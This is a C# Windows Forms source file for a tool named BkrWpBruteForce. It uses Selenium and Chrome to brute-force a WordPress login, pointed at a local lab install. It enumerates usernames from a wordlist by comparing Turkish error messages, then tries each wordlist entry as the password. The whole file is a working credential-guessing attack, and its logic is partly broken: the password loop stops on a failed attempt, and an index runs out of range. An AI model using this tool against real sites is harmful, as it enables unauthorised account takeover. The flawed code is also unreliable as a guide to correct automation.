using System;
using System.Threading;
using System.Windows.Forms;
using OpenQA.Selenium.Chrome;

namespace BkrWpBruteForce
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        string username = ""; string pwd = "";
        Thread th;
        ChromeDriver drv;
        string url = "http://localhost:8080/wphack/wp-login.php";
        private void button1_Click(object sender, EventArgs e)
        {
            Wordlist w = new Wordlist();
            w.ShowDialog();
        }
        private void button2_Click(object sender, EventArgs e)
        {
            th = new Thread(gogoman);th.Start();
        }
        private void gogoman()
        {
            for (int i = 0; i < kmtmrkz.Liste.Count; i++)
            {
                drv.FindElementByXPath("//input[@id='user_login']").SendKeys(kmtmrkz.Liste[i].ToString());
                drv.FindElementByXPath("//input[@id='user_pass']").SendKeys("şifre");
                drv.FindElementByXPath("//input[@id='wp-submit']").Click();
                Thread.Sleep(1000);
                listBox1.Items.Add(kmtmrkz.Liste[i].ToString());
                if (drv.FindElementByXPath("//div[@id='login_error']").Text!= "Bilinmeyen kullanıcı adı. Tekrar kontrol edin ya da e-posta adresinizi deneyin.")
                {
                    username = kmtmrkz.Liste[i].ToString();
                    label2.Text = "User Name : " + username;
                    //drv.FindElementByXPath("//input[@id='user_login']").SendKeys(username);
                    break;
                }
            }
            for (int j = 0; j < kmtmrkz.Liste.Count; j++)
            {
                try
                {
                    try
                    {
                        drv.FindElementByXPath("//input[@id='user_pass']").SendKeys(kmtmrkz.Liste[j].ToString());
                        drv.FindElementByXPath("//input[@id='wp-submit']").Click();
                    }
                    catch 
                    {
                        pwd = "Password : " + kmtmrkz.Liste[j-1].ToString();
                    }
                    Thread.Sleep(1000);
                    listBox2.Items.Add(kmtmrkz.Liste[j].ToString());
                    if (drv.PageSource.IndexOf("admin kullanıcısı için girilen parola geçersiz.") != -1)
                    {
                        pwd = "Password : " + kmtmrkz.Liste[j].ToString();
                        break;
                    }
                }
                catch(Exception ex)
                {
                    MessageBox.Show(ex.Message,"EB");
                    label3.Text = "Password : " + listBox2.Items[listBox2.Items.Count].ToString();
                }
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            th = new Thread(urlac);th.Start();
        }
        void urlac()
        {
            drv = new ChromeDriver();
            drv.Navigate().GoToUrl("http://localhost:8080/wphack/wp-login.php");
        }
    }
}
